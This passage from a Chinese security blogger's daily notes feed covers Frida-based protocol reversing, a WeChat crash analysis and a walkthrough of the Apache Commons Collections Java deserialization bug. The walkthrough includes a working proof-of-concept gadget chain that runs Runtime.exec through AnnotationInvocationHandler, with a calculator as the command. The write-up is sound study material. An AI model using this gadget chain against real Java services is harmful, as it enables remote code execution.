&lt;p&gt;问题来了，这个变量&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pDataLength&lt;/code&gt;是什么呢？&lt;/p&gt;

&lt;p&gt;根据大佬的报告描述，它是包的长度，我们继续往前回溯分析，发现&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pDataLength&lt;/code&gt;来自函数参数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a3&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;我后面还分析了一部分，但是没有运行数据的情况下分析起来感觉没什么意义，就先不贴分析了&lt;/p&gt;

&lt;p&gt;今天拿到了测试机，明天可以跑Frida来打印数据了，我目前遇到最大的问题就是不知道数据从哪里开始一层层组包，也不知道包从哪里开始一层层解包，有中间数据之后分析起来半猜半蒙就好很多了，强行假装自己还能再抢救一会儿&lt;/p&gt;

&lt;p&gt;关于qemu的漏洞利用文章《qemu-pwn cve-2019-6788堆溢出漏洞分析》，写的不错，扩展学习一波&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://ray-cp.github.io/archivers/qemu-pwn-cve-2019-6788%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我今天想到一个很神奇的远程交互代码逻辑分析方式，不过需要先花时间写一个工具，一般情况下我都会把自己的思路无保留的在这里分享，但是这个思路我先藏着，扩展一下可以自动化Fuzz&lt;/p&gt;

&lt;p&gt;一定有其它大佬已经实现了类似的工具了，但是开源的肯定没有&lt;/p&gt;
</description>
                <pubDate>Tue, 31 Mar 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/03/31/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.03.31.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/03/31/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.03.31.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.03.30</title>
                <description>&lt;p&gt;&lt;strong&gt;希望变的和F-Secure Labs一样能打&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;搞移动端应用审计也有段时间了，除了常规的漏洞之外，我更喜欢逻辑漏洞，逻辑漏洞比较依赖梳理代码，比如最常见的就是导出组件，通过发送Intent去调用它，传入数据，能利用到什么程度就看后续的代码都做了哪些工作，比如我传入一个字段&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;url&quot;&lt;/code&gt;，后续直接将这个字段的值进行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loadUrl()&lt;/code&gt;，而且这种漏洞如果存在于系统应用，则可以进行全局的逻辑分析&lt;/p&gt;

&lt;p&gt;F-Secure Labs是我最喜欢的安全团队之一，每篇文章都是实打实的干货，贼能打！&lt;/p&gt;

&lt;p&gt;他们曾经公开分享过如何用十一个逻辑漏洞攻破Samsung S8，相当Nice&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://labs.f-secure.com/assets/BlogFiles/G.-Geshev-and-Rob-Miller-Chainspotting.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这个Slides我不止一次在文章里提过，我也跟着分析过，说真的，完全是可以自动化发现的&lt;/p&gt;

&lt;p&gt;我周末的时候在看即时通讯APP的开发，依旧是两倍速，快速的看了些关键的地方，比如是选择Socket还是XMPP，服务端框架，常见的XMPP客户端，常见的第三方SDK解决方案，还有零零散散的一些其它关于即时通讯的开发教程，总的来说目前是对于即时通讯这部分有了一个初步的认识&lt;/p&gt;

&lt;p&gt;之所以看IM应用是因为我要补全自己对于业务交互数据处理方面的审计能力，像IM应用就是极其合适的一种应用，IM应用的语音模块，视频模块刚好满足我的要求&lt;/p&gt;

&lt;p&gt;这小半年出了一些关于这种通讯类应用的研究成果，向PJ0和盘古的大佬们学习！&lt;/p&gt;

&lt;p&gt;微信的内存破坏漏洞，来自PJ0的女黑客Natashenka，有幸现场看过大佬的演讲，怎么说呢，大佬比照片上看起来更结实一些，果然越强壮技术越强&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1948&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;按照漏洞报告时间来看的话，Natashenka分析的版本应该是v7.0.*，通过对不同版本的对比以及Crash日志的偏移，可以判断是v7.0.5&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#00  pc 0x1d84  /system/lib/libc.so (memcpy+4294873188)
#01  pc 0x1219ff  /data/app/com.tencent.mm-TQNkaubz5b3G-b5myc_RkA==/lib/arm/libvoipCodec.so 
(CAudioJBM::InputAudioFrameToJBM(unsigned char*, int, unsigned int, unsigned short, int, int, int)+2298)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/044D757D9368EA6159B7EA8F037775E6.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;V7.0.6计算出来的位置如下，明显不符合&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/CB1F07420893222F274ABD2428301DF2.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我就是简单看了下，可能计算的不对，接下来再仔细研究学习，网络上分析微信协议啥的文章很多，都看一遍找找感觉，没搞过微信的我心慌慌，万一干不过再把号给整没了:(&lt;/p&gt;

&lt;p&gt;微信这个漏洞我暂时不想硬上去分析，在写脚本辅助分析梳理流程，Frida是我们共同的好朋友:)&lt;/p&gt;

&lt;p&gt;目前我对于这部分是梳理出了一些研究思路，在没有研究成果之前也不好在这里瞎吹，有产出我就写篇文章自吹一下，要是没产出我就当没搞过这玩意，今天就这样吧&lt;/p&gt;

&lt;p&gt;最后：挖到了漏洞有点小成果不要在我这里刷优越感，我可是会拉黑人的:)&lt;/p&gt;
</description>
                <pubDate>Mon, 30 Mar 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/03/30/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.03.30.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/03/30/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.03.30.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.03.27</title>
                <description>&lt;p&gt;前段时间我在写一个逆向辅助工具，1.0版本已经完成了，把自己的手动工作大部分变成了自动化，写完1.0之后，我停下来了一段时间，主要是思考下一版本需要做什么，以及代码结构，我不想写了一大堆之后又要推倒重构&lt;/p&gt;

&lt;p&gt;我不是说这两天开始系统的学习Java开发嘛，接触了一些很好用的IDEA插件，比如Lombok，简直就是Java Bean神器，用注解的方式来大量节约&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set/get&lt;/code&gt;代码，贼棒，刚好就可以用上了&lt;/p&gt;

&lt;p&gt;Java反序列化相关漏洞学习推荐一篇文章《深入理解Java反序列化漏洞》，写的相当好，很多大佬技术能弄的很透彻，但是写起文章来我是真的不敢恭维，能把技术研究透，又能有条理的描述清楚细节，是真的厉害&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://paper.seebug.org/312/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这篇文章里提到了一篇更原始的文章《What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这里说一句题外话：我之所以保持写安全笔记纯粹是为了个人，我想看看自己是不是真正的掌握了这几天学习的技术，能把一个技术点描述到让自己满意，我觉得就是初步掌握了&lt;/p&gt;

&lt;p&gt;Java序列化是指将对象转换为字节流的形式，Java反序列化是指将字节流转换为对象的形式&lt;/p&gt;

&lt;p&gt;比如将对象存储在本地文件里，或者进行网络传输，此时就可以使用Java序列化，当需要读取对象数据或者网络另一方收到数据的时候，此时进行Java反序列化，将字节流转换为Java对象，再进行下一步对象操作&lt;/p&gt;

&lt;p&gt;简单来看个例子，定义一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ClassSerial&lt;/code&gt;类，先对其进行序列化，并写入文件&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;SerialBug&quot;&lt;/code&gt;，完成后进行文本读取，同时反序列化为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ClassSerial&lt;/code&gt;类型，此过程中我们自定义了方法&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readObject()&lt;/code&gt;，除了正常执行之外，我们额外弹出一个计算器，在反序列化过程中，会自动调用这个方法，第三方开发者可以在这里对其进行做一些自定义的操作，可以理解为Android应用的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Application&lt;/code&gt;里的方法&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;attachBaseContext()&lt;/code&gt;，如果我们重写这个方法可以在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onCreate()&lt;/code&gt;之前做一些更早的操作&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public class SerialBug {

    public static void main(String[] args) throws Exception {
    
        // 序列化
        ClassSerial classSerial = new ClassSerial();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(new File(&quot;SerialBug&quot;)));
        objectOutputStream.writeObject(classSerial);
        objectOutputStream.close();

        // 反序列化
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(new File(&quot;SerialBug&quot;)));
        ClassSerial classSerialAfterSerialized = (ClassSerial) objectInputStream.readObject();
        objectInputStream.close();
    }
}

class ClassSerial implements Serializable {
    private int fieldInt;
    private String fieldString;

    private void readObject(ObjectInputStream objectInputStream) throws Exception {
        objectInputStream.defaultReadObject();
        Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;运行起来可以看到弹出了计算器，这好像是我这几个月以来弹的最轻松的一个计算器&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/80228581DB0799B1CD1497B06AA673E8.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;序列化数据头部特征很有趣：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aced 0005&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  SerialBug xxd SerialBug
00000000: aced 0005 7372 000b 436c 6173 7353 6572  ....sr..ClassSer
00000010: 6961 6cac 22a6 e515 61b5 0f02 0002 4900  ial.&quot;...a.....I.
00000020: 0866 6965 6c64 496e 744c 000b 6669 656c  .fieldIntL..fiel
00000030: 6453 7472 696e 6774 0012 4c6a 6176 612f  dStringt..Ljava/
00000040: 6c61 6e67 2f53 7472 696e 673b 7870 0000  lang/String;xp..
00000050: 0000 70                                  ..p
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;由于我也只是刚接触，所以不敢对这部分有过多的结论性描述，我目前对于Java反序列化漏洞的理解是：在反序列化用户可控数据的过程中，自定义方法&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readObject()&lt;/code&gt;存在某些代码导致可以进行逻辑上的利用&lt;/p&gt;

&lt;p&gt;历史上的Java反序列化漏洞非常多，很多文章也描述的很棒，我这里就不过多的去重复写了，分享我对于Apache Commons Collections库反序列化漏洞的理解&lt;/p&gt;

&lt;p&gt;大佬的文章提到了Apache-Commons-Collections库版本&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@us-l-breens:/opt/apache-tomcat-8.0.28# grep -Rl InvokerTransformer .
./webapps/ROOT/WEB-INF/lib/commons-collections-3.2.1.jar
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;存在漏洞的二进制文件可以从这里下载&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://archive.apache.org/dist/commons/collections/binaries/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;很多关于Java反序列化的文章里会写利用ChainedTransformer来执行代码，但是这个特性在代码层面是如何表现的呢？&lt;/p&gt;

&lt;p&gt;通过逆向，我们可以看到接口&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Transformer&lt;/code&gt;定义了一个方法&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;transform()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public interface Transformer {

    /**
     * Transforms the input object (leaving it unchanged) into some output object.
     *
     * @param input  the object to be transformed, should be left unchanged
     * @return a transformed object
     * @throws ClassCastException (runtime) if the input is the wrong class
     * @throws IllegalArgumentException (runtime) if the input is invalid
     * @throws FunctorException (runtime) if the transform cannot be completed
     */
    public Object transform(Object input);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;POC代码中一共使用到三个实现类&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;ChainedTransformer&lt;/li&gt;
  &lt;li&gt;ConstantTransformer&lt;/li&gt;
  &lt;li&gt;InvokerTransformer&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;关键的一段构造&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer(&quot;getMethod&quot;, new Class[] { String.class, Class[].class }, new Object[] { &quot;getRuntime&quot;, new Class[0] }),
        new InvokerTransformer(&quot;invoke&quot;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
        new InvokerTransformer(&quot;exec&quot;, new Class[] { String.class }, new Object[] { &quot;open /System/Applications/Calculator.app&quot; }) };
Transformer transformerChain = new ChainedTransformer(transformers);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;实现类&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ChainedTransformer&lt;/code&gt;，对内部的Transformer一个个进行调用方法&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;transform()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public class ChainedTransformer implements Transformer, Serializable {

    ...
    
    public Object transform(Object object) {
        for (int i = 0; i &amp;lt; iTransformers.length; i++) {
            object = iTransformers[i].transform(object);
        }
        return object;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;实现类&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ConstantTransformer&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public class ConstantTransformer implements Transformer, Serializable {
    
    ...
    
    public ConstantTransformer(Object constantToReturn) {
        super();
        iConstant = constantToReturn;
    }

    public Object transform(Object input) {
        return iConstant;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;实现类&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;InvokerTransformer&lt;/code&gt;，通过反射对我们传入的参数进行方法调用操作，方法名&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;methodName&lt;/code&gt;，参数类型&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;paramTypes&lt;/code&gt;，参数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;args&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public class InvokerTransformer implements Transformer, Serializable {

    ...

    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }

    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);
        } catch (NoSuchMethodException ex) {
            ...
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;抛开触发过程，我们结合三个实现类来走一遍执行流程，方法&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ChainedTransformer.transform()&lt;/code&gt;会循环调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Transformer&lt;/code&gt;数组里的元素，这里的长度是4，也就是会跑4次&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public Object transform(Object object) {
    for (int i = 0; i &amp;lt; iTransformers.length; i++) {
        object = iTransformers[i].transform(object);
    }
    return object;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第一次执行，返回的是对象&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Runtime&lt;/code&gt;，传入的数据是什么无须在意，因为它不处理传入的数据&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;new ConstantTransformer(Runtime.class)

public Object transform(Object input) {
    return iConstant;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第一次执行结束后，变量&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;object&lt;/code&gt;为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;class java.lang.Runtime&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/6D8FC6E80D0B7ACD322162A2070E3D33.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;第二次执行，因为传入的是Object类型，所以需要先使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getMethod()&lt;/code&gt;来获取方法&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getRuntime()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;new InvokerTransformer(
    &quot;getMethod&quot;, 
    new Class[] { String.class, Class[].class }, 
    new Object[] { &quot;getRuntime&quot;, new Class[0] }
)

Object object = Runtime.class;
Class cls = object.getClass();
Method method = cls.getMethod(&quot;getMethod&quot;, new Class[] { String.class, Class[].class });
method.invoke(object, new Object[] { &quot;getRuntime&quot;, new Class[0] });
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第二次执行结束后，变量&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;object&lt;/code&gt;为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;public static java.lang.Runtime java.lang.Runtime.getRuntime()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/4D0832625A3081007BAC280086CC5C70.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;第三次执行，我们现在拥有了方法&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getRuntime()&lt;/code&gt;，自然是使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;invoke()&lt;/code&gt;执行&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;new InvokerTransformer(
    &quot;invoke&quot;,
    new Class[] { Object.class, Object[].class }, 
    new Object[] { null, new Object[0] }
)

Class cls = object.getClass();
Method method = cls.getMethod(&quot;invoke&quot;, new Class[] { Object.class, Object[].class });
method.invoke(object, new Object[] { null, new Object[0] });
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第三次执行结束后，变量&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;object&lt;/code&gt;为对象&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Runtime&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/80C6419CC4F4711CAEEE88A5C3547F6F.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;第四次执行，我们调用对象&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Runtime&lt;/code&gt;的方法&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec()&lt;/code&gt;，此处发生代码执行&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;new InvokerTransformer(
    &quot;exec&quot;, 
    new Class[] { String.class }, 
    new Object[] { &quot;open /System/Applications/Calculator.app&quot; }
)

Class cls = object.getClass();
Method method = cls.getMethod(&quot;exec&quot;, new Class[] { String.class });
return method.invoke(object, new Object[] { &quot;open /System/Applications/Calculator.app&quot; });
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所以代码执行这一套就分析到这里，另一个关键的问题是，我们如何触发这一套流程呢？&lt;/p&gt;

&lt;p&gt;这里涉及到了一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TransformedMap&lt;/code&gt;类，这个类是对Java数据结构Map的扩展，当&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TransformedMap&lt;/code&gt;内元素发生变化时，会触发自定义的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Transformer&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;本地测试如下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public class SerialBug {

    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[] { String.class, Class[].class }, new Object[] { &quot;getRuntime&quot;, new Class[0] }),
                new InvokerTransformer(&quot;invoke&quot;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer(&quot;exec&quot;, new Class[] { String.class }, new Object[] { &quot;open /System/Applications/Calculator.app&quot; }) };
        
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map map = new HashMap();
        map.put(&quot;KEY&quot;, &quot;VALUE&quot;);
        
        Map&amp;lt;String, Object&amp;gt; transformedMap = TransformedMap.decorate(map, null, transformerChain);

        for (Map.Entry&amp;lt;String, Object&amp;gt; entry : transformedMap.entrySet()) {
            entry.setValue(&quot;NOVALUE&quot;);
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;弹出计算器&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/D671951CF14698D9246827D0744FAE29.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;它触发第一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Transformer&lt;/code&gt;的过程如下，首先修改&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TransformedMap&lt;/code&gt;的键值&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/4F8C13E52ECCE599FEBB1D68877C0D9D.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checkSetValue()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/BC049CDA671F60DFEF78A7B8C16CBCE6.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;触发了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Transformer&lt;/code&gt;，于是开始执行我们定义的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ChainedTransformer&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/ED32EDEF6B19E2C3A7F439043E8EDCF8.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里是自己去写代码触发，如果是利用Apache Commons Collections库里现有的代码来触发呢？&lt;/p&gt;

&lt;p&gt;我们看到上面使用的是修改Map的键值，在Apache Commons Collections里，存在一个类&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sun.reflect.annotation.AnnotationInvocationHandler&lt;/code&gt;，它实现了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readObject()&lt;/code&gt;，而且调用了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setValue()&lt;/code&gt;，刚刚好！&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class AnnotationInvocationHandler implements InvocationHandler, Serializable {

    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();
    
        // Check to make sure that types have not evolved incompatibly
     
        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        } catch(IllegalArgumentException e) {
            // Class is no longer an annotation type; all bets are off
            return;
        }
     
        Map&amp;lt;String, Class&amp;lt;?&amp;gt;&amp;gt; memberTypes = annotationType.memberTypes();
    
        for (Map.Entry&amp;lt;String, Object&amp;gt; memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class&amp;lt;?&amp;gt; memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                        value instanceof ExceptionProxy)) {
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(
                                annotationType.members().get(name)));
                }
            }
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最终的测试Poc&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public class SerialBug {

    public static void main(String[] args) throws Exception {
        // 序列化
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(new File(&quot;SerialBug&quot;)));
        objectOutputStream.writeObject(get());
        objectOutputStream.flush();
        objectOutputStream.close();

        // 反序列化
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(new File(&quot;SerialBug&quot;)));
        objectInputStream.readObject();
        objectInputStream.close();
    }

    public static Object get() throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[] { String.class, Class[].class }, new Object[] { &quot;getRuntime&quot;, new Class[0] }),
                new InvokerTransformer(&quot;invoke&quot;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer(&quot;exec&quot;, new Class[] { String.class }, new Object[] { &quot;open /System/Applications/Calculator.app&quot; }) };

        Transformer transformerChain = new ChainedTransformer(transformers);

        Map map = new HashMap();
        map.put(&quot;KEY&quot;, &quot;VALUE&quot;);

        Map&amp;lt;String, Object&amp;gt; transformedMap = TransformedMap.decorate(map, null, transformerChain);

        Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Retention.class, transformedMap);
        return instance;
    }
}
